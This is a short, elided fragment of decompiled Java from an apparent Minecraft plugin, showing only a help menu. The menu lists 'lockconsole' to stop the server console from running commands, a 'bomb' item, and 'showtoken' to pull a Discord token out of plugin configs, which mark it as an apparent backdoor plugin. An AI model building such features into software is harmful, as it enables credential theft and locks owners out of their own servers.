...
extends Command {
    ...
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        ...
        if (args.length <= 1) {
            ...
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lockconsole &8l &fEnables/Disables console to exec cmds"));
            ...
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7bomb &8l &fGives you a bomb to throw!"));
            ...
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7showtoken &8l &fGets Discord token from plugin configs"));
            p2.sendMessage("");
            p2.sendMessage("");
            p2.sendMessage("");
            p2.sendMessage("");
